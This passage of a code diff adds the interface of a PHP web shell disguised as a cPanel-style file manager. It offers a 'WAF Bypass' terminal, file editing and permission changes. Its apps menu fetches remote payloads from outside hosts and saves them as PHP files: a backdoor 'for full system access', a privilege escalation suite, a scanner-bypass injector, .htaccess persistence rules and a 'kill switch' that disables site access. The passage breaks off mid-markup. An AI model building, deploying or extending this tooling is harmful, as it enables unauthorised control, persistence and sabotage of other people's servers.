+        .btn-theme-toggle { width: 100%; padding: 12px; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); color: #fff; border-radius: var(--rad); cursor: pointer; display: flex; justify-content: center; align-items: center; gap: 10px; font-weight: 600; transition: all 0.3s; }
+        .btn-theme-toggle:hover { background: rgba(255,255,255,0.15); border-color: rgba(255,255,255,0.2); }
+
+        /* Content Area */
+        .content { flex-grow: 1; overflow-y: auto; position: relative; padding-bottom: 90px; } 
+        
+        /* Modern Dashboard Layout */
+        .dashboard-container { display: flex; gap: 25px; padding: 25px; max-width: 1400px; margin: 0 auto; align-items: flex-start; }
+        .dashboard-main { flex: 1; display: flex; flex-direction: column; gap: 25px; }
+        .dashboard-side { width: 340px; flex-shrink: 0; display: flex; flex-direction: column; gap: 25px; }
+
+        /* Welcome Banner */
+        .welcome-banner { background: linear-gradient(135deg, var(--cp-blue) 0%, #8e44ad 100%); border-radius: var(--rad); padding: 30px; color: #fff; box-shadow: 0 10px 20px rgba(0,0,0,0.1); position: relative; overflow: hidden; }
+        .welcome-banner::after { content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, rgba(255,255,255,0) 60%); pointer-events: none; }
+        .welcome-title { font-size: 24px; font-weight: 800; margin-bottom: 5px; z-index: 1; position: relative; }
+        .welcome-sub { font-size: 14px; opacity: 0.9; z-index: 1; position: relative; }
+
+        /* Stats Grid */
+        .top-stats-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; }
+        .stat-card { background: var(--cp-card-bg); padding: 20px; border-radius: var(--rad); border: 1px solid var(--cp-border); box-shadow: 0 4px 15px rgba(0,0,0,0.02); display: flex; flex-direction: column; gap: 12px; transition: 0.3s; position: relative; overflow: hidden; }
+        .stat-card:hover { transform: translateY(-5px); box-shadow: 0 8px 25px rgba(0,0,0,0.05); border-color: var(--cp-blue); }
+        .stat-card-title { font-size: 12px; font-weight: 700; color: #888; text-transform: uppercase; letter-spacing: 0.5px; display: flex; align-items: center; gap: 8px; z-index: 1; }
+        .stat-card-title i { font-size: 16px; width: 20px; text-align: center; }
+        .stat-card-val { font-size: 24px; font-weight: 800; color: var(--cp-text); z-index: 1; }
+        .progress-container { width: 100%; background: var(--cp-border); height: 8px; border-radius: 4px; overflow: hidden; z-index: 1; }
+        .progress-bar { height: 100%; background: var(--cp-blue); border-radius: 4px; transition: width 0.5s cubic-bezier(0.4, 0, 0.2, 1); }
+
+        .cp-group { background: var(--cp-card-bg); border: 1px solid var(--cp-border); border-radius: var(--rad); box-shadow: 0 4px 15px rgba(0,0,0,0.02); overflow: hidden; transition: 0.3s; }
+        .cp-group-header { padding: 18px 25px; border-bottom: 1px solid var(--cp-border); background: var(--cp-table-header); font-weight: 800; color: var(--cp-text); font-size: 14px; display: flex; align-items: center; gap: 12px; transition: 0.3s; letter-spacing: 0.5px; }
+        .cp-group-header i { color: var(--cp-blue); font-size: 18px; }
+        .cp-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(130px, 1fr)); padding: 20px; gap: 15px; }
+        
+        .cp-icon { display: flex; flex-direction: column; align-items: center; text-align: center; padding: 20px 10px; color: var(--cp-text); text-decoration: none; border-radius: var(--rad); transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1); gap: 12px; border: 1px solid transparent; }
+        .cp-icon:hover { background: var(--cp-table-hover); transform: translateY(-5px); box-shadow: 0 8px 20px rgba(0,0,0,0.06); border-color: rgba(0, 82, 165, 0.1); }
+        body.dark-theme .cp-icon:hover { border-color: rgba(255, 255, 255, 0.1); }
+        .cp-icon i { font-size: 32px; color: var(--cp-blue); transition: 0.3s; }
+        .cp-icon:hover i { transform: scale(1.1); }
+        .cp-icon span { font-size: 13px; font-weight: 600; line-height: 1.3; }
+
+        /* Dashboard Advanced Panels */
+        .dash-panel-container { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+        @media (max-width: 1024px) { .dash-panel-container { grid-template-columns: 1fr; } }
+        .dash-panel-box { background: var(--cp-card-bg); border: 1px solid var(--cp-border); border-radius: var(--rad); box-shadow: 0 4px 15px rgba(0,0,0,0.02); overflow: hidden; }
+        .dash-panel-header { padding: 15px 20px; border-bottom: 1px solid var(--cp-border); font-weight: 700; background: var(--cp-table-header); color: var(--cp-text); display: flex; align-items: center; gap: 10px; }
+        .dash-panel-body { padding: 20px; }
+        .env-table { width: 100%; border-collapse: collapse; font-size: 13px; }
+        .env-table th, .env-table td { padding: 10px; border-bottom: 1px solid var(--cp-border); text-align: left; }
+        .env-table th { color: #888; font-weight: 600; width: 40%; }
+        .env-table td { font-weight: 700; color: var(--cp-text); }
+        .env-status { padding: 3px 8px; border-radius: 4px; font-size: 11px; font-weight: bold; }
+        .env-status.ok { background: rgba(40,167,69,0.1); color: #28a745; }
+        .env-status.warn { background: rgba(220,53,69,0.1); color: #dc3545; }
+
+        /* Right Sidebar Panels */
+        .side-panel { background: var(--cp-card-bg); border: 1px solid var(--cp-border); border-radius: var(--rad); padding: 25px; box-shadow: 0 4px 15px rgba(0,0,0,0.02); transition: 0.3s; }
+        .side-panel h3 { font-size: 16px; margin-bottom: 20px; color: var(--cp-text); font-weight: 800; border-bottom: 2px solid var(--cp-border); padding-bottom: 12px; display:flex; align-items:center; gap:10px; letter-spacing: 0.5px; }
+        .side-panel h3 i { color: var(--cp-blue); }
+        .about-text { font-size: 14px; line-height: 1.7; color: var(--cp-text); opacity: 0.9;}
+        .about-text strong { color: var(--cp-blue); }
+        .sys-info-list { display: flex; flex-direction: column; gap: 12px; margin-top: 15px; }
+        .sys-info-item { display: flex; justify-content: space-between; align-items: center; padding: 12px 15px; background: var(--cp-table-header); border-radius: 8px; border: 1px dashed var(--cp-border); font-size: 13px; transition: 0.3s; }
+        .sys-info-item:hover { background: var(--cp-table-hover); border-style: solid; border-color: var(--cp-blue); }
+        .sys-info-label { color: #888; font-weight: 600; }
+        .sys-info-val { font-weight: 700; color: var(--cp-text); }
+
+        /* Buttons & Utils */
+        .btn { padding: 8px 15px; border: 1px solid transparent; border-radius: var(--rad); cursor: pointer; color: #fff; font-size: 13px; font-weight: 600; text-decoration: none; display: inline-flex; align-items: center; gap: 6px; transition: 0.2s; }
+        .btn-primary { background: var(--cp-blue); border-color: var(--cp-blue); } .btn-primary:hover { background: var(--cp-blue-hover); box-shadow: 0 4px 10px rgba(0,82,165,0.3); }
+        .btn-danger { background: #dc3545; border-color: #dc3545; } .btn-danger:hover { filter: brightness(0.9); box-shadow: 0 4px 10px rgba(220,53,69,0.3); }
+        .btn-success { background: #28a745; border-color: #28a745; } .btn-success:hover { filter: brightness(0.9); box-shadow: 0 4px 10px rgba(40,167,69,0.3); }
+        .btn-warning { background: #ffc107; color: #000; } .btn-warning:hover { filter: brightness(0.9); }
+        .btn-secondary { background: var(--cp-card-bg); color: var(--cp-text); border-color: var(--cp-border); } .btn-secondary:hover { background: var(--cp-table-hover); }
+        .alert { padding: 15px; border-radius: var(--rad); margin: 20px 25px; background: rgba(40, 167, 69, 0.1); border: 1px solid #28a745; color: #28a745; font-weight: 600; display: flex; justify-content: space-between; }
+
+        /* Mac OS Style Dock */
+        .mac-dock-container { position: fixed; bottom: 15px; left: calc(50% + 140px); transform: translateX(-50%); z-index: 1000; pointer-events: none; display: flex; justify-content: center; }
+        .mac-dock { pointer-events: auto; background: rgba(255, 255, 255, 0.7); backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.4); border-radius: 20px; padding: 12px 25px; display: flex; gap: 18px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); align-items: center; transition: 0.3s; }
+        body.dark-theme .mac-dock { background: rgba(20, 20, 25, 0.7); border: 1px solid rgba(255,255,255,0.1); box-shadow: 0 15px 35px rgba(0,0,0,0.5); }
+        .mac-dock-item { position: relative; display: flex; align-items: center; justify-content: center; width: 48px; height: 48px; border-radius: 14px; background: var(--cp-card-bg); color: var(--cp-blue); text-decoration: none; font-size: 22px; transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1); cursor: pointer; border: 1px solid var(--cp-border); box-shadow: 0 4px 10px rgba(0,0,0,0.05); }
+        .mac-dock-item:hover { transform: scale(1.3) translateY(-12px); background: #fff; border-color: var(--cp-blue); box-shadow: 0 12px 25px rgba(0,0,0,0.15); z-index: 10; color: var(--cp-primary); }
+        body.dark-theme .mac-dock-item:hover { background: #222; }
+        .mac-dock-item::after { content: attr(data-title); position: absolute; top: -38px; background: #222; color: #fff; padding: 6px 12px; border-radius: 6px; font-size: 13px; font-weight: 700; white-space: nowrap; pointer-events: none; opacity: 0; transition: 0.2s; transform: translateY(5px); box-shadow: 0 4px 10px rgba(0,0,0,0.2); }
+        .mac-dock-item:hover::after { opacity: 1; transform: translateY(0); }
+        .dock-divider { width: 1px; height: 35px; background: var(--cp-border); margin: 0 5px; }
+
+        /* File Manager Layout */
+        .fm-header-sticky { position: sticky; top: 0; background: var(--cp-bg); z-index: 80; border-bottom: 1px solid var(--cp-border); padding: 15px 25px; box-shadow: 0 2px 10px rgba(0,0,0,0.03); transition: 0.3s; }
+        .fm-toolbar { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 15px; }
+        .fm-actions { display: flex; gap: 8px; flex-wrap: wrap; align-items: center; }
+        
+        /* Breadcrumb */
+        .breadcrumb-wrapper { display: flex; align-items: center; background: var(--cp-card-bg); border: 1px solid var(--cp-border); border-radius: var(--rad); overflow: hidden; max-width: 600px; box-shadow: inset 0 1px 3px rgba(0,0,0,0.02); transition: 0.3s; }
+        .breadcrumb-locked { display: flex; align-items: center; background: var(--cp-table-header); padding: 8px 12px; border-right: 1px solid var(--cp-border); z-index: 2; font-weight: bold; transition: 0.3s; }
+        .breadcrumb-locked a { color: var(--cp-blue); text-decoration: none; display: flex; align-items: center; gap: 5px; }
+        .breadcrumb-scroll { display: flex; align-items: center; padding: 8px 12px; overflow-x: auto; white-space: nowrap; scrollbar-width: none; flex-grow: 1; font-family: monospace; font-size: 14px; }
+        .breadcrumb-scroll::-webkit-scrollbar { display: none; }
+        .breadcrumb-scroll a { color: var(--cp-text); text-decoration: none; padding: 2px 6px; border-radius: 4px; transition: 0.2s; opacity: 0.8; }
+        .breadcrumb-scroll a:hover { background: var(--cp-table-hover); color: var(--cp-blue); opacity: 1; }
+        .breadcrumb-scroll .separator { color: #888; margin: 0 5px; }
+
+        .fm-content { padding: 0 25px 25px; flex-grow: 1; }
+        
+        .fm-table { width: 100%; border-collapse: collapse; background: var(--cp-card-bg); border: 1px solid var(--cp-border); border-radius: var(--rad); overflow: hidden; box-shadow: 0 2px 5px rgba(0,0,0,0.02); transition: 0.3s; }
+        .fm-table th, .fm-table td { padding: 14px 15px; text-align: left; border-bottom: 1px solid var(--cp-border); font-size: 13px; color: var(--cp-text); }
+        .fm-table th { background-color: var(--cp-table-header); font-weight: 700; font-size: 12px; border-bottom: 2px solid var(--cp-border); transition: 0.3s; }
+        .fm-table tr:hover { background-color: var(--cp-table-hover); }
+        
+        /* Text-based Action Links */
+        .text-action { font-size: 12px; font-weight: 600; color: var(--cp-blue); background: rgba(0, 82, 165, 0.08); padding: 5px 8px; border-radius: 4px; border: 1px solid transparent; margin: 0 2px; text-decoration: none; display: inline-block; transition: 0.2s; cursor: pointer; }
+        .text-action:hover { background: var(--cp-blue); color: #fff; transform: translateY(-1px); box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
+        .text-action.danger { color: #dc3545; background: rgba(220, 53, 69, 0.1); }
+        .text-action.danger:hover { background: #dc3545; color: #fff; }
+        body.dark-theme .text-action { background: #2a2a35; border-color: #333; }
+        body.dark-theme .text-action:hover { background: var(--cp-blue); border-color: var(--cp-blue); }
+        body.dark-theme .text-action.danger:hover { background: #dc3545; border-color: #dc3545; }
+        
+        /* Modals & Animations */
+        @keyframes macAppOpen {
+            0% { transform: scale(0.9); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+        .modal-mac-open .modal-box { animation: macAppOpen 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.1) forwards; }
+        
+        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); backdrop-filter: blur(3px); z-index: 9999; display: none; align-items: center; justify-content: center; }
+        .modal-box { background: var(--cp-card-bg); border-radius: var(--rad); width: 450px; max-width: 95%; box-shadow: 0 15px 40px rgba(0,0,0,0.3); overflow: hidden; display: flex; flex-direction: column; transition: background 0.3s, color 0.3s; border: 1px solid var(--cp-border); }
+        .modal-header { background: var(--cp-table-header); padding: 18px 20px; border-bottom: 1px solid var(--cp-border); font-weight: 700; color: var(--cp-text); display: flex; justify-content: space-between; align-items: center; font-size: 15px; }
+        .modal-body { padding: 20px; color: var(--cp-text); font-size: 14px; max-height: 70vh; overflow-y: auto; }
+        .modal-body input.text-input, .modal-body select { width: 100%; padding: 12px; border: 1px solid var(--cp-border); border-radius: var(--rad); margin-top: 10px; font-size: 14px; box-sizing: border-box; outline: none; transition: 0.2s; background: var(--cp-input-bg); color: var(--cp-text); }
+        .modal-body input.text-input:focus { border-color: var(--cp-blue); box-shadow: 0 0 0 2px rgba(0,82,165,0.2); }
+        .modal-footer { padding: 15px 20px; background: var(--cp-table-header); border-top: 1px solid var(--cp-border); display: flex; justify-content: flex-end; gap: 10px; }
+        .modal-close-btn { background: none; border: none; font-size: 20px; cursor: pointer; color: #888; transition: 0.2s; }
+        .modal-close-btn:hover { color: #dc3545; transform: rotate(90deg); }
+
+        /* CHMOD Dark UI */
+        .chmod-dark-ui { background: #1a1b1e; color: #e1e1e1; padding: 25px; border-radius: var(--rad); font-family: 'Segoe UI', sans-serif; }
+        .chmod-grid { display: flex; gap: 15px; margin-bottom: 25px; }
+        .chmod-col { flex: 1; border: 1px solid #333; border-radius: 6px; padding: 18px 12px 12px; position: relative; }
+        .chmod-title { position: absolute; top: -10px; left: 15px; background: #1a1b1e; padding: 0 8px; font-size: 13px; color: #aaa; font-weight: 600; }
+        .chmod-row { display: flex; align-items: center; gap: 10px; margin-bottom: 10px; font-size: 14px; cursor: pointer; user-select: none; }
+        .chmod-row input[type="checkbox"] { appearance: none; width: 18px; height: 18px; border: 1px solid #555; background: #222; border-radius: 4px; cursor: pointer; display: flex; align-items: center; justify-content: center; outline: none; transition: 0.1s; }
+        .chmod-row input[type="checkbox"]:checked { background: #1eb943; border-color: #1eb943; }
+        .chmod-row input[type="checkbox"]:checked::after { content: '\2714'; color: #fff; font-size: 12px; font-weight: bold; }
+        .chmod-bottom { display: flex; align-items: center; gap: 15px; font-size: 14px; font-weight: 600; }
+        .chmod-input { background: #222; border: 1px solid #444; color: #fff; padding: 8px 12px; border-radius: 6px; width: 65px; font-family: monospace; outline: none; font-size: 14px; }
+
+        /* Terminal Modal */
+        #termModal .modal-box { width: 850px; height: 600px; max-height: 90vh; border: 1px solid #333; }
+        .term-container { background: #0c0c0c; flex: 1; display: flex; flex-direction: column; width: 100%; height: 100%; }
+        .term-output { flex: 1; padding: 20px; overflow-y: auto; color: #0f0; font-family: 'Consolas', monospace; font-size: 14px; white-space: pre-wrap; word-break: break-all; }
+        .term-input-line { display: flex; padding: 15px 20px; background: #151515; border-top: 1px solid #333; align-items: center; }
+        .term-prompt { color: #0ff; font-family: 'Consolas', monospace; font-weight: bold; margin-right: 12px; white-space: nowrap; }
+        .term-input { flex: 1; background: transparent; border: none; color: #0f0; font-family: 'Consolas', monospace; font-size: 14px; outline: none; }
+        
+        /* Code Editor */
+        .editor-container { padding: 0; border: 1px solid var(--cp-border); border-radius: var(--rad); overflow: hidden; margin: 0 25px 25px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
+        .CodeMirror { height: 70vh; font-family: 'Consolas', monospace; font-size: 14px; }
+        
+        /* Search Modal */
+        #searchModal .modal-box { width: 650px; }
+        .search-results { margin-top: 15px; max-height: 350px; overflow-y: auto; background: var(--cp-input-bg); color: var(--cp-text); border: 1px solid var(--cp-border); border-radius: var(--rad); display: none; }
+        
+        /* Bookmarks Modal */
+        #bookmarkModal .modal-box { width: 500px; }
+        .bookmark-list { max-height: 300px; overflow-y: auto; margin-top: 10px; }
+        .bookmark-item { display: flex; justify-content: space-between; align-items: center; padding: 10px 15px; border-bottom: 1px solid var(--cp-border); }
+        .bookmark-item a { color: var(--cp-blue); text-decoration: none; font-weight: 600; font-size: 13px; word-break: break-all; }
+        .bookmark-item button { background: none; border: none; color: #dc3545; cursor: pointer; padding: 5px; transition: 0.2s; }
+        .bookmark-item button:hover { transform: scale(1.1); }
+        
+        /* Professional cPanel-style Apps Menu */
+        #appMenuModal .modal-box { width: 850px; max-width: 95vw; background: var(--cp-bg); }
+        .cpanel-app-section { margin-bottom: 25px; }
+        .cpanel-app-section-title { font-size: 14px; font-weight: 800; color: var(--cp-text); border-bottom: 2px solid var(--cp-border); padding-bottom: 8px; margin-bottom: 15px; text-transform: uppercase; letter-spacing: 0.5px; opacity: 0.9; }
+        .cpanel-app-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(240px, 1fr)); gap: 15px; }
+        .cpanel-app-card { display: flex; align-items: flex-start; gap: 15px; background: var(--cp-card-bg); border: 1px solid var(--cp-border); padding: 15px; border-radius: var(--rad); cursor: pointer; transition: all 0.2s ease; text-decoration: none; position: relative; overflow: hidden; }
+        .cpanel-app-card:hover { transform: translateY(-3px); box-shadow: 0 6px 15px rgba(0,0,0,0.08); border-color: var(--cp-blue); }
+        .cpanel-app-card i { font-size: 26px; width: 35px; text-align: center; margin-top: 2px; }
+        .cpanel-app-details { display: flex; flex-direction: column; gap: 4px; }
+        .cpanel-app-title { font-size: 14px; font-weight: 700; color: var(--cp-blue); }
+        .cpanel-app-desc { font-size: 12px; color: #777; line-height: 1.4; }
+        body.dark-theme .cpanel-app-desc { color: #999; }
+        
+        /* Custom Link Fetcher in Apps */
+        .custom-fetch-form { display: flex; flex-direction: column; gap: 10px; background: var(--cp-table-header); padding: 15px; border-radius: var(--rad); border: 1px dashed var(--cp-border); }
+        .custom-fetch-row { display: flex; gap: 10px; }
+        
+        /* Editor Details Panel */
+        .editor-details-panel { display: flex; gap: 25px; font-size: 13px; color: var(--cp-text); background: var(--cp-table-header); padding: 12px 20px; border-radius: var(--rad); border: 1px solid var(--cp-border); align-items: center; margin-top: 15px; width: 100%; box-shadow: inset 0 1px 3px rgba(0,0,0,0.02); }
+        .editor-details-panel strong { color: var(--cp-blue); margin-right: 5px; }
+        .editor-details-panel div { display: flex; align-items: center; }
+
+    </style>
+</head>
+<body>
+    
+    <div id="cModal" class="modal-overlay">
+        <div class="modal-box">
+            <div class="modal-header">
+                <span id="cModalTitle">Title</span>
+                <button class="modal-close-btn" onclick="closeModal('cModal')"><i class="fas fa-times"></i></button>
+            </div>
+            <div class="modal-body" id="cModalBody"></div>
+            <div class="modal-footer" id="cModalFooter">
+                <button class="btn btn-secondary" onclick="closeModal('cModal')">Cancel (Esc)</button>
+                <button class="btn btn-primary" id="cModalConfirmBtn">Confirm</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="termModal" class="modal-overlay">
+        <div class="modal-box" style="display:flex; flex-direction:column;">
+            <div class="modal-header" style="background: #151515; border-bottom: 1px solid #333; color: #fff;">
+                <span><i class="fas fa-terminal"></i> Terminal CLI (WAF Bypass)</span>
+                <button class="modal-close-btn" onclick="closeModal('termModal')"><i class="fas fa-times"></i></button>
+            </div>
+            <div class="modal-body" style="padding: 0; flex: 1; display: flex;">
+                <div class="term-container">
+                    <div class="term-output" id="term_output"></div>
+                    <div class="term-input-line">
+                        <span class="term-prompt"><?php echo $term_prompt; ?></span>
+                        <input type="text" class="term-input" id="term_input" autocomplete="off" spellcheck="false">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="searchModal" class="modal-overlay">
+        <div class="modal-box">
+            <div class="modal-header">
+                <span><i class="fas fa-search"></i> Global Search (Grep)</span>
+                <button class="modal-close-btn" onclick="closeModal('searchModal')"><i class="fas fa-times"></i></button>
+            </div>
+            <div class="modal-body">
+                <label style="font-size: 13px; font-weight: 700;">Search Type</label>
+                <select id="search_type">
+                    <option value="name">Find by File Name</option>
+                    <option value="content">Find by Content (Grep -rnw)</option>
+                </select>
+                <br><br>
+                <label style="font-size: 13px; font-weight: 700;">Search Query</label>
+                <input type="text" id="search_query" class="text-input" placeholder="Enter keyword to search globally..." autocomplete="off">
+                <div id="search_res_box" class="search-results"></div>
+            </div>
+            <div class="modal-footer">
+                <button class="btn btn-secondary" onclick="closeModal('searchModal')">Close (Esc)</button>
+                <button class="btn btn-primary" id="btnRunSearch"><i class="fas fa-search"></i> Search Now</button>
+            </div>
+        </div>
+    </div>
+    
+    <div id="bookmarkModal" class="modal-overlay">
+        <div class="modal-box">
+            <div class="modal-header">
+                <span><i class="fas fa-bookmark"></i> Saved Bookmarks</span>
+                <button class="modal-close-btn" onclick="closeModal('bookmarkModal')"><i class="fas fa-times"></i></button>
+            </div>
+            <div class="modal-body">
+                <button class="btn btn-success" style="width:100%; margin-bottom: 15px; justify-content:center;" onclick="addBookmark('<?php echo htmlspecialchars($dir); ?>', '<?php echo $dir_b64; ?>')"><i class="fas fa-plus"></i> Bookmark Current Directory</button>
+                <div class="bookmark-list" id="bookmarkListArea"></div>
+            </div>
+        </div>
+    </div>
+
+    <div id="appMenuModal" class="modal-overlay modal-mac-open">
+        <div class="modal-box">
+            <div class="modal-header">
+                <span style="font-size: 16px;"><i class="fas fa-th" style="color:var(--cp-blue); margin-right:8px;"></i> Application Software</span>
+                <button class="modal-close-btn" onclick="closeModal('appMenuModal')"><i class="fas fa-times"></i></button>
+            </div>
+            <div class="modal-body" style="padding: 25px;">
+                
+                <div class="cpanel-app-section">
+                    <div class="cpanel-app-section-title">Security & Penetration Tools</div>
+                    <div class="cpanel-app-grid">
+                        <a href="javascript:void(0)" onclick="submitExec('remote_fetch', '<?php echo base64_encode('https://pastedav.id/d/fzGV1XSK'); ?>', 'ptsmc.php')" class="cpanel-app-card">
+                            <i class="fas fa-shield-virus" style="color:#e74c3c;"></i>
+                            <div class="cpanel-app-details">
+                                <span class="cpanel-app-title">PTSMC Shell</span>
+                                <span class="cpanel-app-desc">Deploy primary backdoor payload for full system access.</span>
+                            </div>
+                        </a>
+                        <a href="javascript:void(0)" onclick="submitExec('remote_fetch', '<?php echo base64_encode('https://pastedav.id/d/tezE2bVU'); ?>', 'emerald.php')" class="cpanel-app-card">
+                            <i class="fas fa-gem" style="color:#2ecc71;"></i>
+                            <div class="cpanel-app-details">
+                                <span class="cpanel-app-title">EMERALD Suite</span>
+                                <span class="cpanel-app-desc">Advanced privilege escalation and exploitation suite.</span>
+                            </div>
+                        </a>
+                        <a href="javascript:void(0)" onclick="submitExec('remote_fetch', '<?php echo base64_encode('https://pastedav.id/d/QbD6L4Tk'); ?>', 'security.php')" class="cpanel-app-card">
+                            <i class="fas fa-lock" style="color:#f39c12;"></i>
+                            <div class="cpanel-app-details">
+                                <span class="cpanel-app-title">Security Bypass</span>
+                                <span class="cpanel-app-desc">Inject scripts to bypass server security and scanners.</span>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+
+                <div class="cpanel-app-section">
+                    <div class="cpanel-app-section-title">Configuration Management</div>
+                    <div class="cpanel-app-grid">
+                        <a href="javascript:void(0)" onclick="submitExec('remote_fetch', '<?php echo base64_encode('https://raw.githubusercontent.com/lenumicaptsmc/ptsmc-group/refs/heads/main/Ht-Access'); ?>', '.htaccess')" class="cpanel-app-card">
+                            <i class="fas fa-file-code" style="color:#3498db;"></i>
+                            <div class="cpanel-app-details">
+                                <span class="cpanel-app-title">HT Backup Injector</span>
+                                <span class="cpanel-app-desc">Overwrite existing .htaccess with persistence rules.</span>
+                            </div>
+                        </a>
+                        <a href="javascript:void(0)" onclick="submitExec('remote_fetch', '<?php echo base64_encode('https://raw.githubusercontent.com/lenumicaptsmc/ptsmc-group/refs/heads/main/Ht-Kill'); ?>', '.htaccess')" class="cpanel-app-card">
+                            <i class="fas fa-skull-crossbones" style="color:#8e44ad;"></i>
+                            <div class="cpanel-app-details">
+                                <span class="cpanel-app-title">HT Kill Switch</span>
+                                <span class="cpanel-app-desc">Destroy routing configurations to disable site access.</span>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+
+                <div class="cpanel-app-section">
+                    <div class="cpanel-app-section-title">Remote File Downloader (Link to File)</div>
+                    <div class="custom-fetch-form">
+                        <div style="font-size: 13px; color: var(--cp-text); margin-bottom: 5px;">Fetch any direct link and save it locally with a custom filename & extension.</div>
+                        <div class="custom-fetch-row">
+                            <input type="text" id="custom_rf_url" class="text-input" placeholder="https://example.com/raw/script.txt" style="flex: 2; margin-top:0;">
+                            <input type="text" id="custom_rf_name" class="text-input" placeholder="filename.php" style="flex: 1; margin-top:0;">
+                            <button class="btn btn-primary" onclick="customRemoteFetch()" style="padding: 0 20px;"><i class="fas fa-download"></i> Fetch</button>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+    </div>
+
+    <div class="mac-dock-container">
+        <div class="mac-dock">
+            <a href="?p=dashboard&dir=<?php echo urlencode($dir_b64); ?>" class="mac-dock-item" data-title="Dashboard"><i class="fas fa-th-large"></i></a>
+            <a href="?p=files&dir=<?php echo urlencode($dir_b64); ?>" class="mac-dock-item" data-title="File Manager"><i class="fas fa-folder-open"></i></a>
+            <div class="dock-divider"></div>
+            
+            <a href="javascript:void(0)" onclick="modalAction('create_folder', '', 'New Folder Name:')" class="mac-dock-item" data-title="New Folder"><i class="fas fa-folder-plus"></i></a>
+            <a href="javascript:void(0)" onclick="modalAction('create_file', '', 'New File Name:')" class="mac-dock-item" data-title="New File"><i class="fas fa-file-medical"></i></a>
+            <a href="javascript:void(0)" onclick="openTerminal()" class="mac-dock-item" data-title="Terminal CLI"><i class="fas fa-terminal"></i></a>
+            
+            <div class="dock-divider"></div>
+            <a href="javascript:void(0)" onclick="openBookmarks()" class="mac-dock-item" data-title="Bookmarks"><i class="fas fa-bookmark"></i></a>
+            <a href="javascript:void(0)" onclick="openAppMenu()" class="mac-dock-item" data-title="Apps Menu"><i class="fas fa-layer-group"></i></a>
+            <div class="dock-divider"></div>
+            
+            <a href="?logout=true" class="mac-dock-item" style="color:#dc3545;" data-title="Logout"><i class="fas fa-power-off"></i></a>
+        </div>
+    </div>
+
+    <div class="wrapper">
+        <div class="sidebar">
+            <div id="fire-particles"></div> <div class="sidebar-content-wrapper">
+                <div class="sidebar-header">
+                    <img src="<?php echo $CPANEL_LOGO; ?>" alt="cPanel Logo">
+                    <div class="user-badge" title="Active User Session">
+                        <i class="fas fa-user-circle" style="color:#ffca28;"></i> <?php echo htmlspecialchars($sys_user); ?>
+                    </div>
+                </div>
+                
+                <ul class="sidebar-menu">
+                    <li><a href="?p=dashboard&dir=<?php echo urlencode($dir_b64); ?>" class="<?php echo $page == 'dashboard' ? 'active' : ''; ?>"><i class="fas fa-th-large"></i> <span class="sidebar-text">Dashboard</span></a></li>
+                </ul>
+
+                <div class="sidebar-list-container">
+                    <div class="sb-section">
+                        <div class="sb-title"><i class="fas fa-star" style="color:var(--cp-primary);"></i> Quick Access</div>
+                        <div class="sb-items">
+                            <a href="?p=files&dir=<?php echo urlencode(base64_encode($_SERVER['DOCUMENT_ROOT'])); ?>" class="sb-item"><i class="fas fa-globe"></i> Document Root</a>
+                            <a href="?p=files&dir=<?php echo urlencode(base64_encode('/tmp')); ?>" class="sb-item"><i class="fas fa-folder" style="color:#999;"></i> /tmp</a>
+                            <a href="?p=files&dir=<?php echo urlencode(base64_encode(dirname(__FILE__))); ?>" class="sb-item"><i class="fas fa-map-marker-alt" style="color:#dc3545;"></i> Current Script Dir</a>
+                        </div>
+                    </div>
+                    
+                    <div class="sb-section">
+                        <div class="sb-title"><i class="fas fa-bookmark" style="color:#3498db;"></i> Saved Bookmarks</div>
+                        <div class="sb-items" id="sidebarBookmarksArea">
+                            <div style="font-size:12px; color:#888; text-align:center; padding:10px 0;">Loading...</div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="sidebar-footer">
+                    <button onclick="toggleTheme()" id="themeToggleBtn" class="btn-theme-toggle">
+                        <i class="fas fa-moon"></i> <span>Dark Mode</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <div class="content">
+            <?php if (!empty($alert_msg)): ?>
+                <div class="alert">
+                    <span><i class="fas fa-check-circle" style="margin-right:8px;"></i> <?php echo htmlspecialchars($alert_msg); ?></span>
+                    <span style="cursor:pointer;" onclick="this.parentElement.style.display='none'">&times;</span>
+                </div>
+            <?php endif; ?>
+
+            <form id="action_form" method="POST" style="display: none;">
+                <input type="hidden" name="action" id="form_action">
+                <input type="hidden" name="target" id="form_target">
+                <input type="hidden" name="new_value" id="form_new_value">
+                <input type="hidden" name="current_dir" id="form_current_dir" value="<?php echo htmlspecialchars($dir_b64); ?>">
+            </form>
+
+            <?php if ($edit_mode && is_file($edit_mode)): ?>
+                
+                <div class="fm-header-sticky" style="display: flex; flex-direction: column; gap: 15px;">
+                    <div style="display: flex; justify-content: space-between; align-items: center; width: 100%;">
+                        <div style="font-weight: 700; font-size: 18px; color:var(--cp-blue); display:flex; align-items:center; gap:10px;">
+                            <i class="fas fa-code"></i> Editing: <?php echo htmlspecialchars(basename($edit_mode)); ?>
+                        </div>
+                        <div style="display: flex; gap: 10px; align-items:center;">
+                            <span style="font-size:12px; opacity:0.7; margin-right:15px;">
